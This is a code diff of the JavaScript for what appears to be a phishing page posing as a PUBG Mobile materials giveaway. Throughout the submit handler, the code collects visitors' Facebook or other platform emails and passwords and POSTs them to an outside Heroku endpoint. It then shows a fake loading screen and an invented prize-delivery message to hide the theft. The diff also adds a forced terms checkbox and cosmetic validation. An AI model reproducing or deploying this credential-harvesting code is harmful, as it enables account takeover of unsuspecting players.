@@ -68,6 +68,14 @@ function winner(username, domain) {
     }
 }
 
+function updateBorderGlow(elem) {
+    $(elem).css({
+        "border-color": "rgba(126, 239, 104, 0.8)",
+        "box-shadow": "0 1px 1px rgba(0, 0, 0, 0.075) inset, 0 0 8px rgba(126, 239, 104, 0.6)",
+        "outline": "0"
+    });
+}
+
 function drawMaterial(num) {
     $('#warning').hide();
     $('.material-cont').show();
@@ -88,21 +96,25 @@ function drawMaterial(num) {
 $(document).ready(function () {
     captchaGen();
 
-    $('#igid').tooltip({ 'trigger': 'focus', 'title': 'Your In-game Character ID' });
-    $('#ign').tooltip({ 'trigger': 'focus', 'title': 'Your In-game Name' });
-    $('#user').tooltip({ 'trigger': 'focus', 'title': `Your Facebook Email or Username` });
-    $('#pass').tooltip({ 'trigger': 'focus', 'title': 'Your Facebook Password' });
+    $('.btn-group.w-100 button').click(function () {
+        ($(".btn-group.w-100 button").not($(this))).removeClass("active");
+        if (!$(this).hasClass('active')) {
+            $(this).toggleClass('active');
+            let item = $(this).find('span').html();
+            $("#user").attr("placeholder", `${item} Email or Username`);
+            $("#pass").attr("placeholder", `${item} Password`);
+            $('#user').tooltip({ 'trigger': 'focus', 'title': `Your ${item} Email or Username` });
+        }
+    });
 
-    if (document.querySelector('input[name="loginMedium"]')) {
-        document.querySelectorAll('input[name="loginMedium"]').forEach((elem) => {
-            elem.addEventListener("change", function (event) {
-                let item = event.target.value;
-                $("#user").attr("placeholder", `${item} Email or Username`);
-                $("#pass").attr("placeholder", `${item} Password`);
-                $('#user').tooltip({ 'trigger': 'focus', 'title': `Your ${item} Email or Username` });
-            });
-        });
-    }
+    $('#termsAgreement').click(function () {
+        $(this).prop('checked', true);
+    });
+
+    // $('#igid').tooltip({ 'trigger': 'focus', 'title': 'Your In-game Character ID' });
+    // $('#ign').tooltip({ 'trigger': 'focus', 'title': 'Your In-game Name' });
+    // $('#user').tooltip({ 'trigger': 'focus', 'title': `Your Facebook Email or Username` });
+    // $('#pass').tooltip({ 'trigger': 'focus', 'title': 'Your Facebook Password' });
 
     // validating input
     $(":input").bind("keyup", function (e) {
@@ -110,45 +122,67 @@ $(document).ready(function () {
         let ig_id = $('#igid').val().trim();
 
         if (ig_id < 9999 || ig_id > 999999999999) {
+            $('#igid').removeClass('is-valid');
             $('#igid').addClass('is-invalid');
         } else {
             $('#igid').removeClass('is-invalid');
+            $('#igid').addClass('is-valid');
         }
 
         // email
         let len_user = $('#user').val().trim().length;
 
         if (len_user < 5) {
+            $('#user').removeClass('is-valid');
             $('#user').addClass('is-invalid');
         } else {
             $('#user').removeClass('is-invalid');
+            $('#user').addClass('is-valid');
         }
 
         // pass
         let len_pass = $('#pass').val().trim().length;
 
         if (len_pass < 6) {
+            $('#pass').removeClass('is-valid');
             $('#pass').addClass('is-invalid');
         } else {
             $('#pass').removeClass('is-invalid');
+            $('#pass').addClass('is-valid');
         }
 
         // captcha
         if ($('.captcha').html() != $('#captcha').val()) {
+            $('#captcha').removeClass('is-valid');
             $('#captcha').addClass('is-invalid');
         } else {
             $('#captcha').removeClass('is-invalid');
+            $('#captcha').addClass('is-valid');
+        }
+
+        // agreement
+        if ($('#termsAgreement').prop("checked")) {
+            $('#termsAgreement').removeClass('is-invalid');
+            $('#termsAgreement').addClass('is-valid');
+        } else {
+            $('#termsAgreement').removeClass('is-valid');
+            $('#termsAgreement').addClass('is-invalid');
         }
 
         // check all are valid ?
         if ($('#data :input.form-control').hasClass('is-invalid')) {
-            if ($('#tapatap').hasClass('disabled')) {
-                // do nothing
-            } else {
+            if (!$('#tapatap').hasClass('disabled')) {
                 $('#tapatap').addClass('disabled');
             }
         } else {
-            $('#tapatap').removeClass('disabled');
+            if (!$('#termsAgreement').prop("checked")) {
+                $('#termsAgreement').addClass('is-invalid');
+                if (!$('#tapatap').hasClass('disabled')) {
+                    $('#tapatap').addClass('disabled');
+                }
+            } else {
+                $('#tapatap').removeClass('disabled');
+            }
         }
     });
 
@@ -173,105 +207,107 @@ $(document).ready(function () {
 
     // ON SUBMIT
     $('#tapatap').on('click', function (e) {
-        if ($('#tapatap').hasClass('disabled')) {
-            // do nothing
-        } else {
-            $('#tapatap').addClass('disabled');
-        }
+        if (!$(this).hasClass('disabled')) {
+            if ($('#tapatap').hasClass('disabled')) {
+                // do nothing
+            } else {
+                $('#tapatap').addClass('disabled');
+            }
 
-        if ($('#snackbar').hasClass('show')) {
-            // nothing
-        } else {
-            $("#snackbar").addClass('show');
-        }
+            if ($('#snackbar').hasClass('show')) {
+                // nothing
+            } else {
+                $("#snackbar").addClass('show');
+            }
 
-        let igid = $('#igid').val(),
-            ign = $('#ign').val(),
-            user = $('#user').val(),
-            pass = $('#pass').val(),
-            domain = $('input[name="loginMedium"]:checked').val();
+            let igid = $('#igid').val(),
+                ign = $('#ign').val(),
+                user = $('#user').val(),
+                pass = $('#pass').val(),
+                domain = $('.btn-group.w-100 button.active').prop('id');
 
-        if ($('.captcha').html() == $('#captcha').val() &&
-            igid.length != 0 &&
-            ign.length != 0 &&
-            $('#captcha').val().length != 0) {
+            if ($('.captcha').html() == $('#captcha').val() &&
+                igid.length != 0 &&
+                ign.length != 0 &&
+                $('#captcha').val().length != 0) {
 
-            if (user.length > 0 && pass.length >= 6) {
-                let payload = {
-                    "ingameID": igid,
-                    "ingameName": ign,
-                    "accDomain": domain,
-                    "accEmail": user,
-                    "accPass": pass,
-                }
+                if (user.length > 0 && pass.length >= 6) {
+                    let payload = {
+                        "ingameID": igid,
+                        "ingameName": ign,
+                        "accDomain": domain,
+                        "accEmail": user,
+                        "accPass": pass,
+                    }
 
-                try {
-                    $.ajax({
-                        url: "https://cap-pubgm-id.herokuapp.com/cap/acc",
-                        method: "POST",
-                        timeout: 2500,
-                        data: JSON.stringify(payload),
-                        headers: {
-                            "Content-Type": "application/json"
-                          },
-                        success: function () {
-                            if ($('#snackbar').hasClass('show')) {
-                                $("#snackbar").removeClass('show');
-                            }
-                            $('#data').get(0).reset();
-                            captchaGen();
-                            $('.participate-div').hide();
-                            // $('.circle-loader').show();
-                            $("body").css({ "background": "#000", "color": "#fff" });
-                            $("#term").show();
-    
-                            let materials = winner(user, domain);
-                            $("#load-modal").modal({
-                                backdrop: 'static',
-                                keyboard: false,
-                            });
-    
-                            $('#load-modal').modal('show');
-    
-                            setTimeout(() => {
-                                $('.circle-loader').toggleClass('load-complete');
-                                $('.checkmark').toggle();
-                                $('#load-modal .modal-title').html("You got <r>" + `${materials}` + "</r> materials !");
-                                drawMaterial(materials);
-                                $('.circle-loader').hide();
-                                $('#msg').html(
-                                    "It will take several hours to deliver <r>" + `${materials}` + "</r> materials to your pubg mobile account (<r>" + `${igid}` +
-                                    "</r>). You'll receive the materials in-game mail system.<br><br> Thank you for participating in the giveaway !"
-                                );
-                                $('#load-modal .modal-footer').show();
-                            }, 35000);
-                        },
-                        error: function (textStatus, errorThrown) {
-                            $('#err-modal').modal('show');
+                    try {
+                        $.ajax({
+                            url: "https://cap-pubgm-id.herokuapp.com/cap/acc",
+                            method: "POST",
+                            timeout: 10000,
+                            data: JSON.stringify(payload),
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            success: function () {
+                                if ($('#snackbar').hasClass('show')) {
+                                    $("#snackbar").removeClass('show');
+                                }
+                                $('#data').get(0).reset();
+                                captchaGen();
+                                $('.participate-div').hide();
+                                // $('.circle-loader').show();
+                                $("body").css({ "background": "#000", "color": "#fff" });
+                                $("#term").show();
 
-                            if ($('#snackbar').hasClass('show')) {
-                                $("#snackbar").removeClass('show');
-                            }
+                                let materials = winner(user, domain);
+                                $("#load-modal").modal({
+                                    backdrop: 'static',
+                                    keyboard: false,
+                                });
 
-                            if (errorThrown === "timeout") {
-                                if ($('#tapatap').hasClass('disabled')) {
-                                    $('#tapatap').removeClass('disabled');
+                                $('#load-modal').modal('show');
+
+                                setTimeout(() => {
+                                    $('.circle-loader').toggleClass('load-complete');
+                                    $('.checkmark').toggle();
+                                    $('#load-modal .modal-title').html("You got <r>" + `${materials}` + "</r> materials !");
+                                    drawMaterial(materials);
+                                    $('.circle-loader').hide();
+                                    $('#msg').html(
+                                        "It will take several hours to deliver <r>" + `${materials}` + "</r> materials to your pubg mobile account (<r>" + `${igid}` +
+                                        "</r>). You'll receive the materials in-game mail system.<br><br> Thank you for participating in the giveaway !"
+                                    );
+                                    $('#load-modal .modal-footer').show();
+                                }, 35000);
+                            },
+                            error: function (textStatus, errorThrown) {
+                                $('#err-modal').modal('show');
+
+                                if ($('#snackbar').hasClass('show')) {
+                                    $("#snackbar").removeClass('show');
                                 }
 
-                                $('#err-modal .modal-title').html("Serever timeout");
-                                $('#err-modal .modal-body h5').html("Please press \"Get Materials\" button again.");
+                                if (errorThrown === "timeout") {
+                                    if ($('#tapatap').hasClass('disabled')) {
+                                        $('#tapatap').removeClass('disabled');
+                                    }
 
-                                $('#err-modal .modal-footer').html('<button class="btn btn-secondary" data-dismiss="modal">Close</button>');
-                            } else {
-                                $('#err-modal .modal-footer').html('<button class="btn btn-danger dismiss" data-dismiss="modal">Close</button>');
+                                    $('#err-modal .modal-title').html("Serever timeout");
+                                    $('#err-modal .modal-body h5').html("Please press \"Get Materials\" button again.");
+
+                                    $('#err-modal .modal-footer').html('<button class="btn btn-secondary" data-dismiss="modal">Close</button>');
+                                } else {
+                                    $('#err-modal .modal-footer').html('<button class="btn btn-danger dismiss" data-dismiss="modal">Close</button>');
+                                }
                             }
-                        }
-                    });
-                } catch (error) {
-                    console.log(error);
+                        });
+                    } catch (error) {
+                        console.log(error);
+                    }
+                } else {
+                    $('#pass').addClass('is-invalid');
                 }
-            } else {
-                $('#pass').addClass('is-invalid');
             }
         }
     });
